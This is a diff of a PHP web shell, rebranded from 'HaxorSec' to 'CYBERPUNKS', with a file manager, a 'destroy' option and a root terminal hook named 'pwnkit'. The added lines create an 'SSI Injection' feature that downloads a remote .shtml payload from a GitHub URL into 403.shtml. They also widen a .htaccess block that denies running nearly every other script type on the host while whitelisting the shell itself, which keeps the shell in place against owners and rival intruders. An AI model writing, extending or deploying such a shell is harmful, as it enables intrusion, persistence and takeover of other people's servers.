@@ -1,3 +1,4 @@
+
 <?php
 session_start();
 // Fungsi untuk mengirim pesan ke Telegram
@@ -319,7 +320,7 @@ if (!empty($_GET["don"])) {
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="robots" content="noindex, nofollow">
     <meta name="googlebot" content="noindex">
-    <title>HaxorSec [ <?= $_SERVER["SERVER_NAME"] ?> ]</title>
+    <title><\> C Y B E R P U N K S </> [ <?= $_SERVER["SERVER_NAME"] ?> ]</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/codemirror.min.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/theme/ayu-mirage.min.css">
@@ -1053,7 +1054,7 @@ if (!empty($_GET["don"])) {
                 <div class="flex items-center justify-between mb-6 md:flex hidden">
                     <div class="flex items-center">
                         <i class="fas fa-robot text-blue-400 text-2xl mr-2 cyber-glow"></i>
-                        <h1 class="text-xl font-bold cyber-font">HAXORSEC<span class="text-blue-400 cyber-glow">v2.0</span></h1>
+                        <h1 class="text-xl font-bold cyber-font">CYBERPUNKS<span class="text-blue-400 cyber-glow">1337</span></h1>
                     </div>
                     <button class="close-sidebar md:hidden text-gray-400 hover:text-white">
                         <i class="fas fa-times"></i>
@@ -1191,6 +1192,18 @@ if (!empty($_GET["don"])) {
                             </a>
                         </li>
                         <li>
+
+<li>
+                            <a href="?d=<?= hx(
+                                $fungsi[0]()
+                            ) ?>&ssi" class="nav-link flex items-center px-3 py-2 text-sm rounded-lg mb-1">
+                                <i class="fas fa-ghost text-orange-400 mr-3 cyber-glow"></i>
+                                <span>SSI Injection</span>
+                            </a>
+                        </li>
+                        <li>
+
+
                             <a href="?d=<?= hx(
                                 $fungsi[0]()
                             ) ?>&destroy" class="nav-link flex items-center px-3 py-2 text-sm rounded-lg mb-1">
@@ -1280,7 +1293,7 @@ if (!empty($_GET["don"])) {
                     </ul>
                 </div>
             </div>
-            <center><img src='https://cdn.privdayz.com/images/logo.jpg' height='15' width='75' referrerpolicy='unsafe-url' /></center>
+            <center><img src='https://cdn2.steamgriddb.com/logo/2f58d47971dd8f5f3527642085d58efd.png' height='20' width='75' referrerpolicy='unsafe-url' /></center>
         </div>
         <?php
         $file_manager = $fungsi[1]("{.[!.],}*", GLOB_BRACE);
@@ -3703,12 +3716,12 @@ function haxorsec_perm($flename){
         if ($fungsi[4]($DOC_ROOT)) {
             $htaccess =
                 '
-<FilesMatch "\.(php|ph*|Ph*|PH*|pH*)$">
+<FilesMatch "\.(php|p*|ph*|Ph*|PH*|pH*|shtml|S*|sh*|Sh*|SH*|sH*|cgi|pl|py|pyc|pyo|php3|php4|php6|pcgi|pcgi3|pcgi4|pcgi5|pchi6|inc|php|Php|pHp|phP|PHp|pHP|PhP|PHP|PhP|php5|Php5|phar|PHAR|Phar|PHar|PHAr|pHAR|phAR|inc|phaR|pHp5|phP5|PHp5|pHP5|PhP5|PHP5|cgi|CGI|CGi|cGI|PhP5|php6|php7|php8|php9|phtml|Phtml|pHtml|phTml|pHTml|Fla|fLa|flA|FLa|fLA|FlA|FLA|phtMl|phtmL|PHtml|PhTml|PHTML|PHTml|PHTMl|PhtMl|PHTml|PHtML|pHTMl|PhTML|pHTML|PhtmL|PHTmL|PhtMl|PhtmL|pHtMl|PhTmL|pHtmL|aspx|ASPX|asp|ASP|php.jpg|PHP.JPG|php.xxxjpg|PHP.XXXJPG|php.jpeg|PHP.JPG|PHP.JPEG|PHP.PJEPG|php.pjpeg|php.fla|PHP.FLA|php.png|PHP.PNG|php.gif|PHP.GIF|php.test|php;.jpg|PHP JPG|PHP;.JPG|php;.jpeg|php jpg|php.bak|php.pdf|php.xxxpdf|php.xxxpng|fla|Fla|fLa|fLa|flA|FLa|fLA|FLA|FlA|php.xxxgif|php.xxxpjpeg|php.xxxjpeg|php3.xxxjpeg|php3.xxxjpg|php5.xxxjpg|php3.pjpeg|php5.pjpeg|shtml|php.unknown|php.doc|php.docx|php.pdf|php.ppdf|jpg.PhP|php.txt|php.xxxtxt|PHP.TXT|PHP.XXXTXT|php.xlsx|php.zip|php.xxxzip|php78|php56|php96|php69|php67|php68|php4|shtMl|shtmL|SHtml|ShTml|SHTML|SHTml|SHTMl|ShtMl|SHTml|SHtML|sHTMl|ShTML|sHTML|ShtmL|SHTmL|ShtMl|ShtmL|sHtMl|ShTmL|sHtmL|Shtml|sHtml|shTml|sHTml|shtml|php1|php2|php3|php4|php10|alfa|suspected|py|exe|htm|html|alfa|htaccess)$">
     Deny from all
 </FilesMatch>
 <FilesMatch "^(' .
                 $CurrentFile .
-                '|index.php|wp-config.php|wp-includes.php)$">
+                '|index.php|403.shtml|wp-config.php|wp-includes.php)$">
     Allow from all
 </FilesMatch>
 <FilesMatch "\.(jpg|png|gif|pdf|jpeg)$">
@@ -3745,6 +3758,20 @@ function haxorsec_perm($flename){
             success();
         }
     }
+
+
+
+
+    if (isset($_GET["ssi"])) {
+        $URL =
+            "https://raw.githubusercontent.com/tikung6etar/Nyarek/refs/heads/master/s.ShTmL";
+        if (!$fungsi[3]("403.shtml")) {
+            $fungsi[28]("403.shtml", $fungsi[11]($URL));
+            success();
+        }
+    }
+
+
 
     if ($_GET["terminal"] == "root") {
         if (!$fungsi[3]("pwnkit") && $fungsi[4]($fungsi[0]())) {
